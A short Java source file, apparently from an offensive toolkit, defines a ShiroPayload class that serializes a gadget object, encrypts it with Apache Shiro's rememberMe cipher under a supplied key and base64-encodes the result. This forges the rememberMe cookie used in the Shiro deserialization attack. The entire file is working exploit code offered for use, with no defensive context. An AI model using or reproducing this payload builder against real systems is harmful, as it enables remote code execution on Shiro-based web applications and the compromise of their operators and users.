package com.ding0x0.other;

import com.ding0x0.Payload;
import com.ding0x0.utils.Code;
import com.ding0x0.yso.payloads.ObjectPayload;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.web.mgt.CookieRememberMeManager;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

public class ShiroPayload extends Payload {

    public Object object;
    byte[] key;


    public ShiroPayload(String key, Object object){
        this.key = Code.base64Decode(key);
        this.object =object;
    }

    public ByteSource getShiroPayload() throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(this.object);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();
        CipherService cipherService = cookieRememberMeManager.getCipherService();
        ByteSource source = cipherService.encrypt(bytes, this.key);
        return source;
    }

    @Override
    public String format() throws Exception {
        return getShiroPayload().toBase64();
    }
}
